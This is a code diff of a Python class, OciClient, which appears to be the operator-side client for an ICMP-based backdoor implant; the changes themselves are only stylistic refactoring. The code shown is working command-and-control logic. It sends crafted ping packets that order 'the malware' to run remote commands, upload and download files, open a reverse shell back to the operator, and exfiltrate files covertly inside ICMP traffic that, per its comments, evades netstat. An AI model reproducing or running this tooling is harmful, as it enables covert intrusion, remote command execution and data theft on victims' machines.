@@ -33,14 +33,14 @@ class OciClient:
         Initial connection is done via ICMP and appears as a ping packet, but then the 
         malware connects back to us on a port we specify. This can be seen by netstat.
         """
-        print('Download %s on %s' % (remote_file, self.target))
+        print(f'Download {remote_file} on {self.target}')
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
             sock.bind(('0.0.0.0', 0))
             port = sock.getsockname()[1]
             sock.listen(5)
             print('Listening on %d...' % port)
             packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
-                    self.__create_payload(cmd=b'download', cmd_line=remote_file.encode('ascii'), 
+                        self.__create_payload(cmd=b'download', cmd_line=remote_file.encode('ascii'), 
                     dest_port=port, dest_addr=socket.inet_aton(self.__get_local_address()))
             self.ok = False
             send(packet)
@@ -74,9 +74,9 @@ class OciClient:
         It can also be seen by netstat.
         """
         with open(filename, 'rb') as f:
-            print('Uploading %s to %s:%d' % (filename, self.target, port))        
+            print('Uploading %s to %s:%d' % (filename, self.target, port))
             packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
-                    self.__create_payload(cmd=b'upload2',
+                        self.__create_payload(cmd=b'upload2',
                     cmd_line=remote_filename.encode('ascii'),
                     dest_port=port)
             send(packet)
@@ -100,7 +100,7 @@ class OciClient:
                     break
                 sock.send(buf)
                 buf = sock.recv(1024)
-            print('Successfully uploaded %s' % filename)
+            print(f'Successfully uploaded {filename}')
                         
     def shell(self):
         """ 
@@ -109,7 +109,7 @@ class OciClient:
         connection back to us or another specified target.
         This connection can be seen by netstat.
         """
-        print('Starting shell %s' % self.target)
+        print(f'Starting shell {self.target}')
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
             # bind to an ephemeral port and tell malware to connect to this port
             sock.bind(('0.0.0.0', 0))
@@ -117,7 +117,7 @@ class OciClient:
             sock.listen(5)
             print('Listening on %d...' % port)
             packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
-                    self.__create_payload(cmd=b'shell',
+                        self.__create_payload(cmd=b'shell',
                     dest_port=port, 
                     dest_addr=socket.inet_aton(self.__get_local_address()))
             send(packet)
@@ -148,12 +148,12 @@ class OciClient:
 
     def exep(self, cmd_line):
         """ Execute command on remote host, wait for 'OK' as icmp message """
-        print('Execute %s on %s' % (cmd_line, self.target))
+        print(f'Execute {cmd_line} on {self.target}')
         if not self.sniffer or not self.sniffer.is_alive():
             raise RuntimeError("sniffer not running")
 
         packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
-                self.__create_payload(cmd=b'exep', cmd_line=cmd_line.encode('ascii'))
+                    self.__create_payload(cmd=b'exep', cmd_line=cmd_line.encode('ascii'))
         self.ok = False
         while not self.ok and not self.stopping:
             send(packet)
@@ -161,7 +161,7 @@ class OciClient:
                 # wait and retry if we haven't received OK as an ICMP message
                 # from our sniffer
                 time.sleep(2)
-        print('Successfully exep %s on %s' % (cmd_line, self.target))
+        print(f'Successfully exep {cmd_line} on {self.target}')
 
     def download3(self, remote_file, local_file):
         """
@@ -171,16 +171,16 @@ class OciClient:
         at a time, and has to wait for acknowledgement from our end. However, the connection
         is more covert and cannot be seen by netstat. The data appears as ping packets only.
         """
-        print('Download3 via ICMP %s from %s' % (remote_file, self.target))
+        print(f'Download3 via ICMP {remote_file} from {self.target}')
         if not self.sniffer or not self.sniffer.is_alive():
             raise RuntimeError("sniffer not running")
 
         local_addr = socket.inet_aton(self.__get_local_address())
         packet = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1234)) / \
-                self.__create_payload(cmd=b'download3', cmd_line=remote_file.encode('ascii'), dest_addr=local_addr)
-        
+                    self.__create_payload(cmd=b'download3', cmd_line=remote_file.encode('ascii'), dest_addr=local_addr)
+
         ack = IP(dst=self.target) / ICMP(id=1, seq=socket.htons(1235)) / \
-                self.__create_payload(cmd=b'OK', dest_addr=local_addr)
+                    self.__create_payload(cmd=b'OK', dest_addr=local_addr)
         send(packet)
         block = 1
         bytes_received = 0
@@ -212,18 +212,18 @@ class OciClient:
                         print('Got block %d, total-bytes-received: %d out of %d, block_size=%d' %
                               (payload.block, bytes_received, payload.len, payload.block_size))
                         bytes_received += payload.block_size
-                        f.write(payload.payload[0:payload.block_size])
+                        f.write(payload.payload[:payload.block_size])
                         send(ack)
                     elif tag == 'ERR':
-                        print('Error opening file %s' % remote_file)
+                        print(f'Error opening file {remote_file}')
                         break
                     elif tag == 'END':
                         print('File received: %s, size=%d' % (remote_file, bytes_received))
                         break
                     else:
-                        print('unknown tag: %s' % tag)
+                        print(f'unknown tag: {tag}')
                 except Exception as e:
-                    print('Protocol error: %s' % e)
+                    print(f'Protocol error: {e}')
 
     def stop(self):
         print("Stopping pingback client...")
@@ -253,10 +253,14 @@ class OciClient:
         print("sniffer started.")
         try:
             while not self.stopping and not self.sniffer_stop_event.is_set():
-                packets = sniff(filter="icmp and host %s" % self.target, count=1, 
-                    stop_filter=lambda p: self.sniffer_stop_event.is_set())
+                packets = sniff(
+                    filter=f"icmp and host {self.target}",
+                    count=1,
+                    stop_filter=lambda p: self.sniffer_stop_event.is_set(),
+                )
+
                 for packet in packets:
-                    if raw(packet[ICMP].payload)[0:2] == b'OK':
+                    if raw(packet[ICMP].payload)[:2] == b'OK':
                         print('rx: OK')
                         self.ok = True
                     elif socket.ntohs(packet[ICMP].seq) == 1234:
@@ -265,7 +269,7 @@ class OciClient:
                             if self.received_payload is None:
                                 self.received_payload = cmd
                         except:
-                            print("Unable to decode payload %s" % raw(packet[ICMP].payload[0:10]))
+                            print(f"Unable to decode payload {raw(packet[ICMP].payload[:10])}")
         except:
             traceback.print_exc(sys.exc_info())
             print("Exception caught in sniffer")
